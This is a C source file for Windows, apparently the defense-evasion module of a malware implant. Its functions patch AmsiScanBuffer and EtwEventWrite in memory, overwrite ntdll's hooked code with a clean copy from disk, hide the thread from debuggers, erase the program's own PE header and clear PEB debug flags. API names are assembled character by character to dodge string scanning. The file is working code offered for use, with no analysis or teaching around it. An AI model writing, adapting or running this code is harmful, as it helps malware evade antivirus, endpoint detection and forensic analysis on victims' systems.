#include <windows.h>
#include <string.h>

typedef LONG (NTAPI *pNtSetInformationThread)(HANDLE, ULONG, PVOID, ULONG);
typedef LONG (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

static void evasion_patch_amsi(void)
{
    char lib[9];
    lib[0]='a'; lib[1]='m'; lib[2]='s'; lib[3]='i';
    lib[4]='.'; lib[5]='d'; lib[6]='l'; lib[7]='l'; lib[8]=0;

    char api[15];
    api[0]='A'; api[1]='m'; api[2]='s'; api[3]='i';
    api[4]='S'; api[5]='c'; api[6]='a'; api[7]='n';
    api[8]='B'; api[9]='u'; api[10]='f'; api[11]='f';
    api[12]='e'; api[13]='r'; api[14]=0;

    HMODULE h = LoadLibraryA(lib);
    if (!h) return;
    FARPROC addr = GetProcAddress(h, api);
    if (!addr) return;

    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old;
    VirtualProtect((LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy((void*)addr, patch, sizeof(patch));
    VirtualProtect((LPVOID)addr, sizeof(patch), old, &old);
}

static void evasion_patch_etw(void)
{
    char api[14];
    api[0]='E'; api[1]='t'; api[2]='w'; api[3]='E';
    api[4]='v'; api[5]='e'; api[6]='n'; api[7]='t';
    api[8]='W'; api[9]='r'; api[10]='i'; api[11]='t';
    api[12]='e'; api[13]=0;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    FARPROC addr = GetProcAddress(ntdll, api);
    if (!addr) return;

    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
    DWORD old;
    VirtualProtect((LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy((void*)addr, patch, sizeof(patch));
    VirtualProtect((LPVOID)addr, sizeof(patch), old, &old);
}

static void evasion_unhook_ntdll(void)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;

    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return; }

    LPVOID pMap = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!pMap) { CloseHandle(hMap); CloseHandle(hFile); return; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    PIMAGE_DOS_HEADER fdos = (PIMAGE_DOS_HEADER)pMap;
    PIMAGE_NT_HEADERS fnt = (PIMAGE_NT_HEADERS)((BYTE*)pMap + fdos->e_lfanew);
    (void)fnt;

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            LPVOID textAddr = (BYTE*)ntdll + sec[i].VirtualAddress;
            DWORD textSize = sec[i].Misc.VirtualSize;
            LPVOID cleanText = (BYTE*)pMap + sec[i].PointerToRawData;
            DWORD old;
            VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy(textAddr, cleanText, textSize);
            VirtualProtect(textAddr, textSize, old, &old);
            break;
        }
    }

    UnmapViewOfFile(pMap);
    CloseHandle(hMap);
    CloseHandle(hFile);
}

static void evasion_hide_thread(void)
{
    char api[24];
    api[0]='N'; api[1]='t'; api[2]='S'; api[3]='e'; api[4]='t';
    api[5]='I'; api[6]='n'; api[7]='f'; api[8]='o'; api[9]='r';
    api[10]='m'; api[11]='a'; api[12]='t'; api[13]='i'; api[14]='o';
    api[15]='n'; api[16]='T'; api[17]='h'; api[18]='r'; api[19]='e';
    api[20]='a'; api[21]='d'; api[22]=0;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    pNtSetInformationThread fn = (pNtSetInformationThread)GetProcAddress(ntdll, api);
    if (!fn) return;
    fn(GetCurrentThread(), 0x11, NULL, 0);
}

static void evasion_stomp_pe_header(void)
{
    HMODULE base = GetModuleHandleA(NULL);
    if (!base) return;
    DWORD old;
    VirtualProtect((LPVOID)base, 64, PAGE_EXECUTE_READWRITE, &old);
    BYTE *p = (BYTE*)base;
    p[0] = 0; p[1] = 0;
    *(LONG*)(p + 0x3C) = 0;
    VirtualProtect((LPVOID)base, 64, old, &old);
}

static void evasion_patch_debug_flags(void)
{
    char api[28];
    api[0]='N'; api[1]='t'; api[2]='Q'; api[3]='u'; api[4]='e';
    api[5]='r'; api[6]='y'; api[7]='I'; api[8]='n'; api[9]='f';
    api[10]='o'; api[11]='r'; api[12]='m'; api[13]='a'; api[14]='t';
    api[15]='i'; api[16]='o'; api[17]='n'; api[18]='P'; api[19]='r';
    api[20]='o'; api[21]='c'; api[22]='e'; api[23]='s'; api[24]='s';
    api[25]=0;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    pNtQueryInformationProcess fn = (pNtQueryInformationProcess)GetProcAddress(ntdll, api);
    if (!fn) return;

    struct { PVOID r1; PVOID peb; PVOID r2; PVOID r3; ULONG_PTR r4; PVOID r5; } pbi;
    ULONG rlen = 0;
    memset(&pbi, 0, sizeof(pbi));
    if (fn(GetCurrentProcess(), 0, &pbi, sizeof(pbi), &rlen) != 0) return;
    if (!pbi.peb) return;

    BYTE *peb = (BYTE*)pbi.peb;
    peb[2] = 0;

#ifdef _WIN64
    DWORD flags = *(DWORD*)(peb + 0xBC);
    if (flags & 0x70) *(DWORD*)(peb + 0xBC) = flags & ~0x70;
#else
    DWORD flags = *(DWORD*)(peb + 0x68);
    if (flags & 0x70) *(DWORD*)(peb + 0x68) = flags & ~0x70;
#endif
}

void evasion_run(void)
{
    evasion_patch_amsi();
    evasion_patch_etw();
    evasion_unhook_ntdll();
    evasion_hide_thread();
    evasion_stomp_pe_header();
    evasion_patch_debug_flags();
}
